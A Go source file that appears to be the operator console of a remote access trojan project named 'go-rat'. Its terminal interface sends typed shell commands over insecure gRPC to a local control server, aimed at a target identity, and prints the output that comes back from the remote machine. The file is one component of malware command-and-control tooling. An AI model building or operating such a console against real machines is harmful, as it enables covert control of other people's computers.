package main

import (
	"context"
	"fmt"
	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/charmbracelet/log"
	"github.com/iortego42/go-rat/grpcapi"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"os"
)

var prompt = lipgloss.NewStyle().
	SetString("|> ").
	Foreground(lipgloss.Color("#9fef00"))

var bye = lipgloss.NewStyle().
	SetString("Bye").
	Border(lipgloss.RoundedBorder()).
	Padding(0, 1).
	Bold(true)

var outputStyle = lipgloss.NewStyle().
	Padding(0).
	TabWidth(0)

type model struct {
	input  textinput.Model
	client grpcapi.AdminClient
	ctx    context.Context
	cmd    *grpcapi.Command
	id     *grpcapi.Identity
}

func initModel() *model {
	var m *model = &model{}
	m.input = textinput.New()
	m.input.PromptStyle = prompt
	m.input.Focus()
	m.cmd = new(grpcapi.Command)
	m.cmd.Id = os.Args[1]
	m.ctx = context.Background()
	return m
}

func (m model) exec() tea.Msg {
	var _exec = func() tea.Msg {
		var err error
		m.cmd, err = m.client.RunCommand(m.ctx, m.cmd)
		if err != nil {
			return err.Error()
		}
		fmt.Println(m.cmd.Out)
		return "ok"
	}
	return _exec()
}

func (m model) Init() tea.Cmd {
	return nil
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmd tea.Cmd

	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "enter":
			m.cmd.In = m.input.Value()
			m.cmd.Out = ""
			m.input.Reset()
			return m, m.exec
		case "ctrl+c":
			fmt.Println(bye.Render())
			return m, tea.Quit
		}
	}
	m.input, cmd = m.input.Update(msg)
	return m, cmd
}

func (m model) View() string {
	return m.input.View()
}

func main() {
	var (
		opts []grpc.DialOption
		err  error
		conn *grpc.ClientConn
		//client grpcapi.AdminClient
		m *model
	)
	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	conn, err = grpc.NewClient("127.0.0.1:9090", opts...)
	if err != nil {
		log.Fatal("[!] No se pudo establecer conexión con el servidor principal.", "ERROR", err)
	}
	defer conn.Close()
	m = initModel()
	m.client = grpcapi.NewAdminClient(conn)
	p := tea.NewProgram(m)
	if _, err := p.Run(); err != nil {
		log.Fatal(err)
	}
	//client = grpcapi.NewAdminClient(conn)
	//mainLoop(client)
}
